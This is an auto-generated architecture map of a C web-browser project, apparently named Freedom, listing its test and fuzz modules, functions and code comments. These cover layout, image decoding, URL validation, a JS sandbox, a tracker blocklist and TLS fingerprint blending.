    src_js_dom_c_jd_click_state["jd_click_state"]
    class src_js_dom_c_jd_click_state cls;
    src_js_dom_c --> src_js_dom_c_jd_click_state
    src_js_dom_c_jd_opaque_get["jd_opaque_get"]
    class src_js_dom_c_jd_opaque_get fn;
    src_js_dom_c --> src_js_dom_c_jd_opaque_get
    src_js_dom_c_jd_idx["jd_idx"]
    class src_js_dom_c_jd_idx fn;
    src_js_dom_c --> src_js_dom_c_jd_idx
    src_js_dom_c_jd_handle["jd_handle"]
    class src_js_dom_c_jd_handle fn;
    src_js_dom_c --> src_js_dom_c_jd_handle
    tests_test_dom_c["test_dom.c (c)"]
    class tests_test_dom_c mod;
    tests_test_dom_c_setup_doc["setup_doc"]
    class tests_test_dom_c_setup_doc fn;
    tests_test_dom_c --> tests_test_dom_c_setup_doc
    tests_test_dom_c_teardown_doc["teardown_doc"]
    class tests_test_dom_c_teardown_doc fn;
    tests_test_dom_c --> tests_test_dom_c_teardown_doc
    tests_test_dom_c_test_build_null_args["test_build_null_args"]
    class tests_test_dom_c_test_build_null_args fn;
    tests_test_dom_c --> tests_test_dom_c_test_build_null_args
    tests_test_dom_c_test_free_null_and_double["test_free_null_and_double"]
    class tests_test_dom_c_test_free_null_and_double fn;
    tests_test_dom_c --> tests_test_dom_c_test_free_null_and_double
    tests_test_dom_c_test_node_count["test_node_count"]
    class tests_test_dom_c_test_node_count fn;
    tests_test_dom_c --> tests_test_dom_c_test_node_count
    tests_test_html_parse_c["test_html_parse.c (c)"]
    class tests_test_html_parse_c mod;
    tests_test_html_parse_c_test_config_default_is_secure["test_config_default_is_secure"]
    class tests_test_html_parse_c_test_config_default_is_secure fn;
    tests_test_html_parse_c --> tests_test_html_parse_c_test_config_default_is_secure
    tests_test_html_parse_c_test_validate_rejects_null["test_validate_rejects_null"]
    class tests_test_html_parse_c_test_validate_rejects_null fn;
    tests_test_html_parse_c --> tests_test_html_parse_c_test_validate_rejects_null
    tests_test_html_parse_c_test_validate_rejects_empty["test_validate_rejects_empty"]
    class tests_test_html_parse_c_test_validate_rejects_empty fn;
    tests_test_html_parse_c --> tests_test_html_parse_c_test_validate_rejects_empty
    tests_test_html_parse_c_test_validate_rejects_oversize["test_validate_rejects_oversize"]
    class tests_test_html_parse_c_test_validate_rejects_oversize fn;
    tests_test_html_parse_c --> tests_test_html_parse_c_test_validate_rejects_oversize
    tests_test_html_parse_c_test_validate_accepts_within_cap["test_validate_accepts_within_cap"]
    class tests_test_html_parse_c_test_validate_accepts_within_cap fn;
    tests_test_html_parse_c --> tests_test_html_parse_c_test_validate_accepts_within_cap
    src_text_shape_c["text_shape.c (c)"]
    class src_text_shape_c mod;
    src_text_shape_c_tsh_entry["tsh_entry"]
    class src_text_shape_c_tsh_entry cls;
    src_text_shape_c --> src_text_shape_c_tsh_entry
    src_text_shape_c_generic_name["generic_name"]
    class src_text_shape_c_generic_name fn;
    src_text_shape_c --> src_text_shape_c_generic_name
    src_text_shape_c_backend_init["backend_init"]
    class src_text_shape_c_backend_init fn;
    src_text_shape_c --> src_text_shape_c_backend_init
    src_text_shape_c_read_font_file["read_font_file"]
    class src_text_shape_c_read_font_file fn;
    src_text_shape_c --> src_text_shape_c_read_font_file
    src_text_shape_c_load_entry["load_entry"]
    class src_text_shape_c_load_entry fn;
    src_text_shape_c --> src_text_shape_c_load_entry
    tests_test_text_shape_c["test_text_shape.c (c)"]
    class tests_test_text_shape_c mod;
    tests_test_text_shape_c_test_null_and_bad_inputs["test_null_and_bad_inputs"]
    class tests_test_text_shape_c_test_null_and_bad_inputs fn;
    tests_test_text_shape_c --> tests_test_text_shape_c_test_null_and_bad_inputs
    tests_test_text_shape_c_test_empty_slice_is_ok["test_empty_slice_is_ok"]
    class tests_test_text_shape_c_test_empty_slice_is_ok fn;
    tests_test_text_shape_c --> tests_test_text_shape_c_test_empty_slice_is_ok
    tests_test_text_shape_c_test_shape_ascii["test_shape_ascii"]
    class tests_test_text_shape_c_test_shape_ascii fn;
    tests_test_text_shape_c --> tests_test_text_shape_c_test_shape_ascii
    tests_test_text_shape_c_test_determinism["test_determinism"]
    class tests_test_text_shape_c_test_determinism fn;
    tests_test_text_shape_c --> tests_test_text_shape_c_test_determinism
    tests_test_text_shape_c_test_measure_matches_shape["test_measure_matches_shape"]
    class tests_test_text_shape_c_test_measure_matches_shape fn;
    tests_test_text_shape_c --> tests_test_text_shape_c_test_measure_matches_shape
    tests_test_secure_fetch_c["test_secure_fetch.c (c)"]
    class tests_test_secure_fetch_c mod;
    tests_test_secure_fetch_c_test_config_blend_fields_default_null["test_config_blend_fields_default_null"]
    class tests_test_secure_fetch_c_test_config_blend_fields_default_null fn;
    tests_test_secure_fetch_c --> tests_test_secure_fetch_c_test_config_blend_fields_default_null
    tests_test_secure_fetch_c_test_user_agent_default_when_unset["test_user_agent_default_when_unset"]
    class tests_test_secure_fetch_c_test_user_agent_default_when_unset fn;
    tests_test_secure_fetch_c --> tests_test_secure_fetch_c_test_user_agent_default_when_unset
    tests_test_secure_fetch_c_test_user_agent_uses_override["test_user_agent_uses_override"]
    class tests_test_secure_fetch_c_test_user_agent_uses_override fn;
    tests_test_secure_fetch_c --> tests_test_secure_fetch_c_test_user_agent_uses_override
    tests_test_secure_fetch_c_test_url_rejects_null["test_url_rejects_null"]
    class tests_test_secure_fetch_c_test_url_rejects_null fn;
    tests_test_secure_fetch_c --> tests_test_secure_fetch_c_test_url_rejects_null
    tests_test_secure_fetch_c_test_url_rejects_plain_http["test_url_rejects_plain_http"]
    class tests_test_secure_fetch_c_test_url_rejects_plain_http fn;
    tests_test_secure_fetch_c --> tests_test_secure_fetch_c_test_url_rejects_plain_http
    tests_test_url_c["test_url.c (c)"]
    class tests_test_url_c mod;
    tests_test_url_c_test_is_https["test_is_https"]
    class tests_test_url_c_test_is_https fn;
    tests_test_url_c --> tests_test_url_c_test_is_https
    tests_test_url_c_test_validate_https["test_validate_https"]
    class tests_test_url_c_test_validate_https fn;
    tests_test_url_c --> tests_test_url_c_test_validate_https
    tests_test_url_c_test_validate_long_bundle_url["test_validate_long_bundle_url"]
    class tests_test_url_c_test_validate_long_bundle_url fn;
    tests_test_url_c --> tests_test_url_c_test_validate_long_bundle_url
    tests_test_url_c_test_has_scheme["test_has_scheme"]
    class tests_test_url_c_test_has_scheme fn;
    tests_test_url_c --> tests_test_url_c_test_has_scheme
    tests_test_url_c_test_authority_len["test_authority_len"]
    class tests_test_url_c_test_authority_len fn;
    tests_test_url_c --> tests_test_url_c_test_authority_len
    tests_test_box_tree_c["test_box_tree.c (c)"]
    class tests_test_box_tree_c mod;
    tests_test_box_tree_c_assert_rect["assert_rect"]
    class tests_test_box_tree_c_assert_rect fn;
    tests_test_box_tree_c --> tests_test_box_tree_c_assert_rect
    tests_test_box_tree_c_test_null_root["test_null_root"]
    class tests_test_box_tree_c_test_null_root fn;
    tests_test_box_tree_c --> tests_test_box_tree_c_test_null_root
    tests_test_box_tree_c_test_leaf["test_leaf"]
    class tests_test_box_tree_c_test_leaf fn;
    tests_test_box_tree_c --> tests_test_box_tree_c_test_leaf
    tests_test_box_tree_c_test_leaf_with_padding["test_leaf_with_padding"]
    class tests_test_box_tree_c_test_leaf_with_padding fn;
    tests_test_box_tree_c --> tests_test_box_tree_c_test_leaf_with_padding
    tests_test_box_tree_c_test_block_stacking_with_collapse["test_block_stacking_with_collapse"]
    class tests_test_box_tree_c_test_block_stacking_with_collapse fn;
    tests_test_box_tree_c --> tests_test_box_tree_c_test_block_stacking_with_collapse
    src_dom_debug_c["dom_debug.c (c)"]
    class src_dom_debug_c mod;
    src_dom_debug_c_dd_cursor["dd_cursor"]
    class src_dom_debug_c_dd_cursor cls;
    src_dom_debug_c --> src_dom_debug_c_dd_cursor
    src_dom_debug_c_dd_putc["dd_putc"]
    class src_dom_debug_c_dd_putc fn;
    src_dom_debug_c --> src_dom_debug_c_dd_putc
    src_dom_debug_c_dd_emit["dd_emit"]
    class src_dom_debug_c_dd_emit fn;
    src_dom_debug_c --> src_dom_debug_c_dd_emit
    src_dom_debug_c_dd_puts["dd_puts"]
    class src_dom_debug_c_dd_puts fn;
    src_dom_debug_c --> src_dom_debug_c_dd_puts
    src_dom_debug_c_dd_printf["dd_printf"]
    class src_dom_debug_c_dd_printf fn;
    src_dom_debug_c --> src_dom_debug_c_dd_printf
    tests_test_data_url_c["test_data_url.c (c)"]
    class tests_test_data_url_c mod;
    tests_test_data_url_c_test_is_data_url_true["test_is_data_url_true"]
    class tests_test_data_url_c_test_is_data_url_true fn;
    tests_test_data_url_c --> tests_test_data_url_c_test_is_data_url_true
    tests_test_data_url_c_test_is_data_url_false["test_is_data_url_false"]
    class tests_test_data_url_c_test_is_data_url_false fn;
    tests_test_data_url_c --> tests_test_data_url_c_test_is_data_url_false
    tests_test_data_url_c_test_payload_basic["test_payload_basic"]
    class tests_test_data_url_c_test_payload_basic fn;
    tests_test_data_url_c --> tests_test_data_url_c_test_payload_basic
    tests_test_data_url_c_test_payload_no_mediatype["test_payload_no_mediatype"]
    class tests_test_data_url_c_test_payload_no_mediatype fn;
    tests_test_data_url_c --> tests_test_data_url_c_test_payload_no_mediatype
    tests_test_data_url_c_test_payload_empty["test_payload_empty"]
    class tests_test_data_url_c_test_payload_empty fn;
    tests_test_data_url_c --> tests_test_data_url_c_test_payload_empty
    tests_test_local_store_c["test_local_store.c (c)"]
    class tests_test_local_store_c mod;
    tests_test_local_store_c_roundtrip_raw["roundtrip_raw"]
    class tests_test_local_store_c_roundtrip_raw fn;
    tests_test_local_store_c --> tests_test_local_store_c_roundtrip_raw
    tests_test_local_store_c_test_roundtrip_aes["test_roundtrip_aes"]
    class tests_test_local_store_c_test_roundtrip_aes fn;
    tests_test_local_store_c --> tests_test_local_store_c_test_roundtrip_aes
    tests_test_local_store_c_test_roundtrip_chacha["test_roundtrip_chacha"]
    class tests_test_local_store_c_test_roundtrip_chacha fn;
    tests_test_local_store_c --> tests_test_local_store_c_test_roundtrip_chacha
    tests_test_local_store_c_test_empty_plaintext["test_empty_plaintext"]
    class tests_test_local_store_c_test_empty_plaintext fn;
    tests_test_local_store_c --> tests_test_local_store_c_test_empty_plaintext
    tests_test_local_store_c_test_wrong_key["test_wrong_key"]
    class tests_test_local_store_c_test_wrong_key fn;
    tests_test_local_store_c --> tests_test_local_store_c_test_wrong_key
    tests_test_browser_c["test_browser.c (c)"]
    class tests_test_browser_c mod;
    tests_test_browser_c_test_init["test_init"]
    class tests_test_browser_c_test_init fn;
    tests_test_browser_c --> tests_test_browser_c_test_init
    tests_test_browser_c_test_navigate_history["test_navigate_history"]
    class tests_test_browser_c_test_navigate_history fn;
    tests_test_browser_c --> tests_test_browser_c_test_navigate_history
    tests_test_browser_c_test_navigate_from_middle_discards_future["test_navigate_from_middle_discards_future"]
    class tests_test_browser_c_test_navigate_from_middle_discards_future fn;
    tests_test_browser_c --> tests_test_browser_c_test_navigate_from_middle_discards_future
    tests_test_browser_c_test_back_forward_bounds["test_back_forward_bounds"]
    class tests_test_browser_c_test_back_forward_bounds fn;
    tests_test_browser_c --> tests_test_browser_c_test_back_forward_bounds
    tests_test_browser_c_test_rejects_invalid_url["test_rejects_invalid_url"]
    class tests_test_browser_c_test_rejects_invalid_url fn;
    tests_test_browser_c --> tests_test_browser_c_test_rejects_invalid_url
    tests_test_freebug_c["test_freebug.c (c)"]
    class tests_test_freebug_c mod;
    tests_test_freebug_c_test_push_and_read["test_push_and_read"]
    class tests_test_freebug_c_test_push_and_read fn;
    tests_test_freebug_c --> tests_test_freebug_c_test_push_and_read
    tests_test_freebug_c_test_empty_and_null_text["test_empty_and_null_text"]
    class tests_test_freebug_c_test_empty_and_null_text fn;
    tests_test_freebug_c --> tests_test_freebug_c_test_empty_and_null_text
    tests_test_freebug_c_test_count_cap_fails_closed["test_count_cap_fails_closed"]
    class tests_test_freebug_c_test_count_cap_fails_closed fn;
    tests_test_freebug_c --> tests_test_freebug_c_test_count_cap_fails_closed
    tests_test_freebug_c_test_entry_truncated_not_dropped["test_entry_truncated_not_dropped"]
    class tests_test_freebug_c_test_entry_truncated_not_dropped fn;
    tests_test_freebug_c --> tests_test_freebug_c_test_entry_truncated_not_dropped
    tests_test_freebug_c_test_total_bytes_cap_fails_closed["test_total_bytes_cap_fails_closed"]
    class tests_test_freebug_c_test_total_bytes_cap_fails_closed fn;
    tests_test_freebug_c --> tests_test_freebug_c_test_total_bytes_cap_fails_closed
    tests_test_tls_impersonate_c["test_tls_impersonate.c (c)"]
    class tests_test_tls_impersonate_c mod;
    tests_test_tls_impersonate_c_test_gate_requires_all_three_signals["test_gate_requires_all_three_signals"]
    class tests_test_tls_impersonate_c_test_gate_requires_all_three_signals fn;
    tests_test_tls_impersonate_c --> tests_test_tls_impersonate_c_test_gate_requires_all_three_signals
    tests_test_tls_impersonate_c_test_encode_decode_req_roundtrip["test_encode_decode_req_roundtrip"]
    class tests_test_tls_impersonate_c_test_encode_decode_req_roundtrip fn;
    tests_test_tls_impersonate_c --> tests_test_tls_impersonate_c_test_encode_decode_req_roundtrip
    tests_test_tls_impersonate_c_test_encode_decode_req_empty_body["test_encode_decode_req_empty_body"]
    class tests_test_tls_impersonate_c_test_encode_decode_req_empty_body fn;
    tests_test_tls_impersonate_c --> tests_test_tls_impersonate_c_test_encode_decode_req_empty_body
    tests_test_tls_impersonate_c_test_encode_decode_resp_roundtrip["test_encode_decode_resp_roundtrip"]
    class tests_test_tls_impersonate_c_test_encode_decode_resp_roundtrip fn;
    tests_test_tls_impersonate_c --> tests_test_tls_impersonate_c_test_encode_decode_resp_roundtrip
    tests_test_tls_impersonate_c_test_resp_no_chain_ok["test_resp_no_chain_ok"]
    class tests_test_tls_impersonate_c_test_resp_no_chain_ok fn;
    tests_test_tls_impersonate_c --> tests_test_tls_impersonate_c_test_resp_no_chain_ok
    tests_test_renderer_c["test_renderer.c (c)"]
    class tests_test_renderer_c mod;
    tests_test_renderer_c_test_render_basic["test_render_basic"]
    class tests_test_renderer_c_test_render_basic fn;
    tests_test_renderer_c --> tests_test_renderer_c_test_render_basic
    tests_test_renderer_c_test_render_strips_script["test_render_strips_script"]
    class tests_test_renderer_c_test_render_strips_script fn;
    tests_test_renderer_c --> tests_test_renderer_c_test_render_strips_script
    tests_test_renderer_c_test_render_null_args["test_render_null_args"]
    class tests_test_renderer_c_test_render_null_args fn;
    tests_test_renderer_c --> tests_test_renderer_c_test_render_null_args
    tests_test_renderer_c_test_render_too_large["test_render_too_large"]
    class tests_test_renderer_c_test_render_too_large fn;
    tests_test_renderer_c --> tests_test_renderer_c_test_render_too_large
    tests_test_renderer_c_test_render_binary_does_not_crash_parent["test_render_binary_does_not_crash_parent"]
    class tests_test_renderer_c_test_render_binary_does_not_crash_parent fn;
    tests_test_renderer_c --> tests_test_renderer_c_test_render_binary_does_not_crash_parent
    fuzz_fuzz_dom_debug_c["fuzz_dom_debug.c (c)"]
    class fuzz_fuzz_dom_debug_c mod;
    fuzz_fuzz_dom_debug_c_pass["pass"]
    class fuzz_fuzz_dom_debug_c_pass fn;
    fuzz_fuzz_dom_debug_c --> fuzz_fuzz_dom_debug_c_pass
    tests_test_flex_layout_c["test_flex_layout.c (c)"]
    class tests_test_flex_layout_c mod;
    tests_test_flex_layout_c_assert_item["assert_item"]
    class tests_test_flex_layout_c_assert_item fn;
    tests_test_flex_layout_c --> tests_test_flex_layout_c_assert_item
    tests_test_flex_layout_c_test_grow_equal["test_grow_equal"]
    class tests_test_flex_layout_c_test_grow_equal fn;
    tests_test_flex_layout_c --> tests_test_flex_layout_c_test_grow_equal
    tests_test_flex_layout_c_test_grow_weighted["test_grow_weighted"]
    class tests_test_flex_layout_c_test_grow_weighted fn;
    tests_test_flex_layout_c --> tests_test_flex_layout_c_test_grow_weighted
    tests_test_flex_layout_c_test_shrink_equal["test_shrink_equal"]
    class tests_test_flex_layout_c_test_shrink_equal fn;
    tests_test_flex_layout_c --> tests_test_flex_layout_c_test_shrink_equal
    tests_test_flex_layout_c_test_shrink_with_min_clamp["test_shrink_with_min_clamp"]
    class tests_test_flex_layout_c_test_shrink_with_min_clamp fn;
    tests_test_flex_layout_c --> tests_test_flex_layout_c_test_shrink_with_min_clamp
    tests_test_image_decode_c["test_image_decode.c (c)"]
    class tests_test_image_decode_c mod;
    tests_test_image_decode_c_px["px"]
    class tests_test_image_decode_c_px fn;
    tests_test_image_decode_c --> tests_test_image_decode_c_px
    tests_test_image_decode_c_test_sniff_png["test_sniff_png"]
    class tests_test_image_decode_c_test_sniff_png fn;
    tests_test_image_decode_c --> tests_test_image_decode_c_test_sniff_png
    tests_test_image_decode_c_test_sniff_unsupported["test_sniff_unsupported"]
    class tests_test_image_decode_c_test_sniff_unsupported fn;
    tests_test_image_decode_c --> tests_test_image_decode_c_test_sniff_unsupported
    tests_test_image_decode_c_test_dimensions_from_ihdr["test_dimensions_from_ihdr"]
    class tests_test_image_decode_c_test_dimensions_from_ihdr fn;
    tests_test_image_decode_c --> tests_test_image_decode_c_test_dimensions_from_ihdr
    tests_test_image_decode_c_test_dimensions_truncated["test_dimensions_truncated"]
    class tests_test_image_decode_c_test_dimensions_truncated fn;
    tests_test_image_decode_c --> tests_test_image_decode_c_test_dimensions_truncated
    tests_test_js_sandbox_c["test_js_sandbox.c (c)"]
    class tests_test_js_sandbox_c mod;
    tests_test_js_sandbox_c_test_validate_rejects_null["test_validate_rejects_null"]
    class tests_test_js_sandbox_c_test_validate_rejects_null fn;
    tests_test_js_sandbox_c --> tests_test_js_sandbox_c_test_validate_rejects_null
    tests_test_js_sandbox_c_test_validate_rejects_empty["test_validate_rejects_empty"]
    class tests_test_js_sandbox_c_test_validate_rejects_empty fn;
    tests_test_js_sandbox_c --> tests_test_js_sandbox_c_test_validate_rejects_empty
    tests_test_js_sandbox_c_test_validate_rejects_oversize["test_validate_rejects_oversize"]
    class tests_test_js_sandbox_c_test_validate_rejects_oversize fn;
    tests_test_js_sandbox_c --> tests_test_js_sandbox_c_test_validate_rejects_oversize
    tests_test_js_sandbox_c_test_validate_accepts_within_cap["test_validate_accepts_within_cap"]
    class tests_test_js_sandbox_c_test_validate_accepts_within_cap fn;
    tests_test_js_sandbox_c --> tests_test_js_sandbox_c_test_validate_accepts_within_cap
    tests_test_js_sandbox_c_test_context_new_and_free["test_context_new_and_free"]
    class tests_test_js_sandbox_c_test_context_new_and_free fn;
    tests_test_js_sandbox_c --> tests_test_js_sandbox_c_test_context_new_and_free
    tests_test_pdf_export_c["test_pdf_export.c (c)"]
    class tests_test_pdf_export_c mod;
    tests_test_pdf_export_c_pagination["pagination"]
    class tests_test_pdf_export_c_pagination fn;
    tests_test_pdf_export_c --> tests_test_pdf_export_c_pagination
    tests_test_pdf_export_c_test_basename_maps_spaces_and_reserved["test_basename_maps_spaces_and_reserved"]
    class tests_test_pdf_export_c_test_basename_maps_spaces_and_reserved fn;
    tests_test_pdf_export_c --> tests_test_pdf_export_c_test_basename_maps_spaces_and_reserved
    tests_test_pdf_export_c_test_basename_rejects_path_separators["test_basename_rejects_path_separators"]
    class tests_test_pdf_export_c_test_basename_rejects_path_separators fn;
    tests_test_pdf_export_c --> tests_test_pdf_export_c_test_basename_rejects_path_separators
    tests_test_pdf_export_c_test_basename_neutralizes_traversal["test_basename_neutralizes_traversal"]
    class tests_test_pdf_export_c_test_basename_neutralizes_traversal fn;
    tests_test_pdf_export_c --> tests_test_pdf_export_c_test_basename_neutralizes_traversal
    tests_test_pdf_export_c_test_basename_dotdot_only_falls_back["test_basename_dotdot_only_falls_back"]
    class tests_test_pdf_export_c_test_basename_dotdot_only_falls_back fn;
    tests_test_pdf_export_c --> tests_test_pdf_export_c_test_basename_dotdot_only_falls_back
    src_image_decode_c["image_decode.c (c)"]
    class src_image_decode_c mod;
    src_image_decode_c_jpeg_err_ctx["jpeg_err_ctx"]
    class src_image_decode_c_jpeg_err_ctx cls;
    src_image_decode_c --> src_image_decode_c_jpeg_err_ctx
    src_image_decode_c_gif_reader["gif_reader"]
    class src_image_decode_c_gif_reader cls;
    src_image_decode_c --> src_image_decode_c_gif_reader
    src_image_decode_c_gif_bits["gif_bits"]
    class src_image_decode_c_gif_bits cls;
    src_image_decode_c --> src_image_decode_c_gif_bits
    src_image_decode_c_read_be32["read_be32"]
    class src_image_decode_c_read_be32 fn;
    src_image_decode_c --> src_image_decode_c_read_be32
    src_image_decode_c_img_png_dimensions["img_png_dimensions"]
    class src_image_decode_c_img_png_dimensions fn;
    src_image_decode_c --> src_image_decode_c_img_png_dimensions
    tests_test_box_style_c["test_box_style.c (c)"]
    class tests_test_box_style_c mod;
    tests_test_box_style_c_dbl_eq["dbl_eq"]
    class tests_test_box_style_c_dbl_eq fn;
    tests_test_box_style_c --> tests_test_box_style_c_dbl_eq
    tests_test_box_style_c_assert_edges["assert_edges"]
    class tests_test_box_style_c_assert_edges fn;
    tests_test_box_style_c --> tests_test_box_style_c_assert_edges
    tests_test_box_style_c_test_body_has_no_margin["test_body_has_no_margin"]
    class tests_test_box_style_c_test_body_has_no_margin fn;
    tests_test_box_style_c --> tests_test_box_style_c_test_body_has_no_margin
    tests_test_box_style_c_test_paragraph["test_paragraph"]
    class tests_test_box_style_c_test_paragraph fn;
    tests_test_box_style_c --> tests_test_box_style_c_test_paragraph
    tests_test_box_style_c_test_heading_ladder["test_heading_ladder"]
    class tests_test_box_style_c_test_heading_ladder fn;
    tests_test_box_style_c --> tests_test_box_style_c_test_heading_ladder
    tests_test_hostblock_c["test_hostblock.c (c)"]
    class tests_test_hostblock_c mod;
    tests_test_hostblock_c_test_free_null_idempotent["test_free_null_idempotent"]
    class tests_test_hostblock_c_test_free_null_idempotent fn;
    tests_test_hostblock_c --> tests_test_hostblock_c_test_free_null_idempotent
    tests_test_hostblock_c_test_count_null_set["test_count_null_set"]
    class tests_test_hostblock_c_test_count_null_set fn;
    tests_test_hostblock_c --> tests_test_hostblock_c_test_count_null_set
    tests_test_hostblock_c_test_load_null_args["test_load_null_args"]
    class tests_test_hostblock_c_test_load_null_args fn;
    tests_test_hostblock_c --> tests_test_hostblock_c_test_load_null_args
```

---

## Architecture Reference

### C (120 files)

#### `fuzz_css.c`
**Path:** `fuzz/fuzz_css.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 61) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_data_url.c`
**Path:** `fuzz/fuzz_data_url.c`

**Functions:**
- `worker` (line 5) `* confined tab worker (OP_DECODE_IMAGE_B64) on bytes the parent only sliced, never
 * interpreted...`

#### `fuzz_dom.c`
**Path:** `fuzz/fuzz_dom.c`

**Functions:**
- `ensure_built` (line 40) `static void ensure_built(void)`
- `LLVMFuzzerTestOneInput` (line 47) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_dom_debug.c`
**Path:** `fuzz/fuzz_dom_debug.c`

**Functions:**
- `pass` (line 8) `* the measure pass (cap 0) must agree with the would-write return value.
 *
 * Build & run: make ...`

#### `fuzz_download.c`
**Path:** `fuzz/fuzz_download.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 30) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_freebug.c`
**Path:** `fuzz/fuzz_freebug.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 36) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_html_parse.c`
**Path:** `fuzz/fuzz_html_parse.c`

*No symbols extracted*

#### `fuzz_image_decode.c`
**Path:** `fuzz/fuzz_image_decode.c`

**Functions:**
- `poke_and_free` (line 21) `static void poke_and_free(img_pixels *px)` - *Touch every claimed pixel corner so the sanitizer flags an out-of-bounds extent, * then release. Safe on a zeroed (failed-decode) struct.*
- `LLVMFuzzerTestOneInput` (line 31) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_js_sandbox.c`
**Path:** `fuzz/fuzz_js_sandbox.c`

*No symbols extracted*

#### `fuzz_page_view.c`
**Path:** `fuzz/fuzz_page_view.c`

*No symbols extracted*

#### `fuzz_pdf_export.c`
**Path:** `fuzz/fuzz_pdf_export.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 29) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_prefetch.c`
**Path:** `fuzz/fuzz_prefetch.c`
**File Doc:** *libFuzzer harness for the prefetch lookahead scanner (Hito 29). The scanned*

**Functions:**
- `LLVMFuzzerTestOneInput` (line 9) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)` - *include "prefetch.h"*

#### `fuzz_prefs.c`
**Path:** `fuzz/fuzz_prefs.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 20) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `fuzz_text_shape.c`
**Path:** `fuzz/fuzz_text_shape.c`

**Functions:**
- `LLVMFuzzerTestOneInput` (line 24) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)` - *define FZ_CAP 2048u*

**Macros:**
- `FZ_CAP` (line 22)

#### `fuzz_tls_impersonate.c`
**Path:** `fuzz/fuzz_tls_impersonate.c`

*No symbols extracted*

#### `fuzz_url.c`
**Path:** `fuzz/fuzz_url.c`

**Functions:**
- `check_split` (line 29) `static void check_split(const char *url)`
- `LLVMFuzzerTestOneInput` (line 57) `int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)`

#### `browser_ui.c`
**Path:** `gui/browser_ui.c`

**Functions:**
- `now_ms` (line 136) `static uint64_t now_ms(void)` - *Largest text slice measured/drawn at once (one word, or one clipped label). * Words longer than this are still placed, just measured up to the cap. #define UI_SLICE_MAX 512 /* Monotonic millisecond clock for toast timing (caller of the pure browser API).*
- `gutter` (line 488) `* gutter (content_margin) is intentionally left unzoomed, like a browser's text
 * zoom. The PDF ...`
- `apply_zoom` (line 509) `static void apply_zoom(browser_window *w)` - *Applies a new zoom level: rebuild the theme and repaint. The page is laid out fresh from w->theme on every paint, so no re-fetch and no worker round-trip are * needed -- the text simply reflows at the new size.*
- `buffer_release` (line 519) `static void buffer_release(void *data, struct wl_buffer *wl_buffer)` - *Applies a new zoom level: rebuild the theme and repaint. The page is laid out fresh from w->theme on every paint, so no re-fetch and no worker round-trip are * needed -- the text simply reflows at the new size. static void apply_zoom(browser_window *w) { apply_theme(w); char msg[48]; snprintf(msg, sizeof msg, "Zoom %d%%", w->zoom_pct); browser_set_status(&w->bs, msg, now_ms()); profile_sync(w);  /* the zoom level persists across sessions redraw(w); } /* --- shm buffer (same pattern as ui_render.c) ---*
- `destroy_buffer` (line 525) `static void destroy_buffer(browser_window *w)`
- `ensure_buffer` (line 531) `static int ensure_buffer(browser_window *w)`
- `read_file` (line 561) `static char *read_file(const char *path, size_t *out_len)` - *w->buffer = wl_shm_pool_create_buffer(pool, 0, w->width, w->height, stride, WL_SHM_FORMAT_ARGB8888); wl_shm_pool_destroy(pool); close(fd); if (w->buffer == NULL) { munmap(data, size); return -1; } wl_buffer_add_listener(w->buffer, &buffer_listener, w); w->shm_data = data; w->shm_size = size; w->cairo_surface = cairo_image_surface_create_for_data( (unsigned char *)data, CAIRO_FORMAT_ARGB32, w->width, w->height, stride); return (cairo_surface_status(w->cairo_surface) == CAIRO_STATUS_SUCCESS) ? 0 : -1; } /* --- page loading ---*
- `build_file_origin` (line 601) `static int build_file_origin(const char *path_or_url, char *out, size_t outsz)` - *Builds a "file:///<canonical absolute path>" origin from a local path (or passes through a file:// URL's path). realpath canonicalizes; on failure (file gone, too long) returns 0 and the caller proceeds with no origin (local images then simply do not resolve). This origin makes a local page "act like https": relative * references and images resolve against it, confined to its own directory.*
- `load_host_file` (line 611) `static void load_host_file(hb_set *s, const char *dir, const char *name, hb_list list)` - *Loads one /etc/hosts-format .conf file (if present and readable) into the given * list. A missing file is not an error: the filter fails open, never over-blocking.*
- `build_host_filter` (line 628) `static hb_set *build_host_filter(void)` - *Builds the host filter from the user's .conf lists. Privacy by Default: block.conf (a /etc/hosts-format blocklist) blocks trackers/ads and their subdomains; allow.conf re-enables specific (sub)domains and wins over the blocklist. Directories are tried in order -- $FREEDOM_HOSTS_DIR, then ~/.config/freedom, then ./config (repo-local) -- and each that exists is loaded cumulatively. Returns NULL only on OOM (hb_check * then treats every host as allowed).*
- `build_js_filter` (line 674) `static hb_set *build_js_filter(void)`
- `build_impersonate_filter` (line 678) `static hb_set *build_impersonate_filter(void)` - *impersonate.conf: the THIRD opt-in signal. A host here (and in allow.conf and js.conf) * gets the Chrome/Firefox-consistent TLS ClientHello blend (spec/tls_impersonate.md).*
- `freedom_write_dir` (line 683) `static int freedom_write_dir(char *out, size_t cap)` - *The writable Freedom config dir: $FREEDOM_HOSTS_DIR if set, else ~/.config/freedom (created if absent). Returns 0 on success. Mirrors the read search path so an edit * lands where build_host_filter/build_js_filter will read it back.*
- `add_current_host_to_list` (line 708) `static void add_current_host_to_list(browser_window *w, int sel)` - *Appends the current page's host to one of the user's .conf lists (block/allow/js), then reloads the in-memory filter so it applies. The host is hostile data with provenance: the pure hostedit validates it fail-closed and builds the line; a * duplicate is skipped. Feedback goes through the status toast.*
- `load_favorites` (line 776) `static void load_favorites(browser_window *w)` - *Concatenates the allow.conf bodies along the same search path build_host_filter uses into one string: the omnibox "favorites". Frees any previous value. Best-effort * (a missing/oversized file is skipped); on OOM favorites stays NULL (no suggestions).*
